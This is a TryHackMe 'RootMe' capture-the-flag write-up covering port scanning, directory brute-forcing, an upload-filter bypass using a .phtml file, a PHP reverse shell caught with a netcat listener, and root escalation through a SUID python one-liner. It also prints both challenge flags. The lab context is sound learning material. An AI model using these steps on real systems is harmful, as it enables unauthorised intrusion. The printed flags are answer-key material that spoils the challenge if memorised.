
# RootMe - TryHackMe Challenge Write-Up

**Machine:** RootMe  

---

## Task 1: Deploy the Machine

- Deploy the machine using the TryHackMe platform.

---

## Task 2: Reconnaissance

### 1. How many ports are open?

Determine the number of open ports using nmap by running the following command:

```bash
nmap $IP
```

**Result:**  
There are 2 open ports:  

- Port 22 (SSH)  
- Port 80 (HTTP)

### 2. What version of Apache is running?

'-sV', used for apache detection, use -p for specifying ports

```bash
nmap -sV -p 80,22 $IP
```

**Result:**  
- Apache Version: `2.4.29`

### 3. What service is running on port 22?

The service running on port 22 is **SSH**.

### 4. Find directories on the web server using the GoBuster tool.

Use the **GoBuster** tool to brute-force hidden directories using WORDLIST: common.txt from github

```bash
gobuster dir --url $IP --wordlist $WORDLIST_PATH
```

**Result:**  
`/panel/` 

---

## Task 3: Getting a Shell

### 1. Find the user flag.

Navigate to the `/panel` directory. This appears to be an upload page.Testing for a **file upload vulnerability** by uploading different file types.

### 2. File Upload Bypass

- Uploading a `.php` file is blocked.  
- Try changing the file extension to `.php3`, or `.phtml`.  
- The server accepts the file with a `.phtml` extension (.php3 also accepted but not executable). This allows us to upload a **PHP reverse shell**.

### 3. Getting Reverse Shell Access

- Use the [pentestmonkey PHP reverse shell script](http://pentestmonkey.net/tools/web-shells/php-reverse-shell).
- Upload the script to the web server with the `.phtml` extension.
- Setting up a listener on the local machine using Netcat:

```bash
nc -lnvp 1234
```

- Executing the uploaded script by visiting the following URL:

```bash
http://$IP/uploads/<REV_SHELL_SCRIPT.phtml>
```

**Result:**  
Reverse shell connection recieved.

### 4. Finding the User Flag

The user flag is located in `/var/www/user.txt`. Searching for the file using the `find` command:

```bash
find / -name user.txt 2>/dev/null
```

**User Flag:**  
```
THM{y0u_g0t_a_sh3ll}
```

---

## Task 4: Privilege Escalation

### 1. Search for files with SUID permission.

Files with **SUID** permission can be exploited for privilege escalation. Searching for files having SUID bit:

```bash
find / -perm -u=s 2>/dev/null
```

**Result:**  
A suspicious file: `/usr/bin/python`

### 2. Exploit Python SUID

Python has the SUID bit set and is owned by root. According to [GTFOBins](https://gtfobins.github.io/), this can be exploited to escalate privileges.

Run the following command to gain a root shell:

```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

**Result:**  
Aquired a **root shell**.

### 3. Finding the Root Flag

The root flag is located in the root user's home directory `/root/root.txt`.

**Root Flag:**  
```
THM{pr1v1l3g3_3sc4l4t10n}
```

---

## Summary

- **Ports Open:** 22 (SSH), 80 (HTTP)  
- **Apache Version:** 2.4.29  
- **Service on Port 22:** SSH  
- **Key Directories Found:** `/panel/`, `/uploads/`  
- **User Flag:** THM{y0u_g0t_a_sh3ll}  
- **Root Flag:** THM{pr1v1l3g3_3sc4l4t10n}
